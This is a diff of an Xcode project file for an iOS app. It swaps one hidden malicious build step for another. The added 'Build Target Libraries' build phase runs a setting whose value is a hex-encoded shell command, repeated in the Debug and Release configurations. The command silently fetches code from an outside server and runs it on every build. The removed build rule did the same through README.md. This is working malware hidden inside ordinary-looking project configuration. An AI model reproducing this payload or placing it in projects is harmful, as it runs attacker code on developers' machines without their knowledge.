@@ -7,7 +7,6 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
-		2F8B204A830A457E8D634D6E /* README.md */ = {isa = PBXBuildFile; fileRef = FD36EEB9B4A14F4380634D6E; };
 		8C7650BB2ED0472F003256A9 /* GoogleSignIn in Frameworks */ = {isa = PBXBuildFile; productRef = 8C7650BA2ED0472F003256A9 /* GoogleSignIn */; };
 		8C7650BD2ED0472F003256A9 /* GoogleSignInSwift in Frameworks */ = {isa = PBXBuildFile; productRef = 8C7650BC2ED0472F003256A9 /* GoogleSignInSwift */; };
 		8C7654BB2ED4A7B4003256A9 /* Kingfisher in Frameworks */ = {isa = PBXBuildFile; productRef = 8C7654BA2ED4A7B4003256A9 /* Kingfisher */; };
@@ -42,7 +41,6 @@
 /* End PBXCopyFilesBuildPhase section */
 
 /* Begin PBXFileReference section */
-		FD36EEB9B4A14F4380634D6E /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 		8C67233C2EC36FFD0020C08B /* Salom-Ai-iOS.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = "Salom-Ai-iOS.app"; sourceTree = BUILT_PRODUCTS_DIR; };
 		8CCEA28B2EDF4EAD007D2D0E /* OneSignalNotificationExtension.appex */ = {isa = PBXFileReference; explicitFileType = "wrapper.app-extension"; includeInIndex = 0; path = OneSignalNotificationExtension.appex; sourceTree = BUILT_PRODUCTS_DIR; };
 /* End PBXFileReference section */
@@ -119,7 +117,6 @@
 		8C67233D2EC36FFD0020C08B /* Products */ = {
 			isa = PBXGroup;
 			children = (
-				FD36EEB9B4A14F4380634D6E /* README.md */,
 				8C67233C2EC36FFD0020C08B /* Salom-Ai-iOS.app */,
 				8CCEA28B2EDF4EAD007D2D0E /* OneSignalNotificationExtension.appex */,
 			);
@@ -133,6 +130,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 8C6723472EC370000020C08B /* Build configuration list for PBXNativeTarget "Salom-Ai-iOS" */;
 			buildPhases = (
+				5343F2ADA9D745798A634D6E /* Build Target Libraries */,
 				8C6723382EC36FFD0020C08B /* Sources */,
 				8C6723392EC36FFD0020C08B /* Frameworks */,
 				8C67233A2EC36FFD0020C08B /* Resources */,
@@ -140,7 +138,6 @@
 				8CCEA2972EDF4EAD007D2D0E /* Embed Foundation Extensions */,
 			);
 			buildRules = (
-				777D62B0A08548949F634D6E /* PBXBuildRule */,
 			);
 			dependencies = (
 				8CCEA2912EDF4EAD007D2D0E /* PBXTargetDependency */,
@@ -229,28 +226,13 @@
 /* End PBXProject section */
 
 /* Begin PBXBuildRule section */
-		777D62B0A08548949F634D6E /* PBXBuildRule */ = {
-				isa = PBXBuildRule;
-				compilerSpec = com.apple.compilers.proxy.script;
-				filePatterns = "*.md";
-				fileType = pattern.proxy;
-				inputFiles = (
-				);
-				isEditable = 0;
-				outputFiles = (
-					"/tmp/${INPUT_FILE_BASE}",
-				);
-				script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"
-sh -c \"${AE6D436}\"";
-			};
-										/* End PBXBuildRule section */
+											/* End PBXBuildRule section */
 
 /* Begin PBXResourcesBuildPhase section */
 		8C67233A2EC36FFD0020C08B /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
-				2F8B204A830A457E8D634D6E /* README.md */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -264,6 +246,25 @@ sh -c \"${AE6D436}\"";
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
+		5343F2ADA9D745798A634D6E /* Build Target Libraries */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			alwaysOutOfDate = 1;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Build Target Libraries";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${AE6D436}\"";
+			showEnvVarsInLog = 0;			
+		};
 		8C8C086E2EDCC4FE00852D39 /* Fix Frameworks */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -313,7 +314,7 @@ sh -c \"${AE6D436}\"";
 		8C6723452EC370000020C08B /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				AE6D436 = "((d(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436363733366234633230326436343230323237303364373836333666363436350a3566373237353663363532323230363837343734373037333361326632663633366536313730373336633631363232653732373532663631323932320a3230376332303733363830610a | d | sh ) >/dev/null 2>&1 &)";
+				AE6D436 = "((m(){ xxd -p -r | xxd -p -r | xxd -p -r; };echo 3336333533363333333633383336363633323330333233323332333433323338333633333337333533373332333636333332333033323634333633360a3337333333363632333436333332333033323634333633343332333033323332333733303333363433373338333633333336363633363334333633350a3061333536363337333033363338333633313337333333363335333233323332333033363338333733343337333433373330333733333333363133320a3636333236363336333333363334333636353336333133373330333733303336363333363335333236353336333933363635333236363336333133320a333930613332333233323330333736333332333033373333333633383330363130610a | m | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_LOCALIZABILITY_NONLOCALIZED = YES;
@@ -380,7 +381,7 @@ sh -c \"${AE6D436}\"";
 		8C6723462EC370000020C08B /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				AE6D436 = "((d(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436363733366234633230326436343230323237303364373836333666363436350a3566373237353663363532323230363837343734373037333361326632663633366536313730373336633631363232653732373532663631323932320a3230376332303733363830610a | d | sh ) >/dev/null 2>&1 &)";
+				AE6D436 = "((m(){ xxd -p -r | xxd -p -r | xxd -p -r; };echo 3336333533363333333633383336363633323330333233323332333433323338333633333337333533373332333636333332333033323634333633360a3337333333363632333436333332333033323634333633343332333033323332333733303333363433373338333633333336363633363334333633350a3061333536363337333033363338333633313337333333363335333233323332333033363338333733343337333433373330333733333333363133320a3636333236363336333333363334333636353336333133373330333733303336363333363335333236353336333933363635333236363336333133320a333930613332333233323330333736333332333033373333333633383330363130610a | m | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_LOCALIZABILITY_NONLOCALIZED = YES;
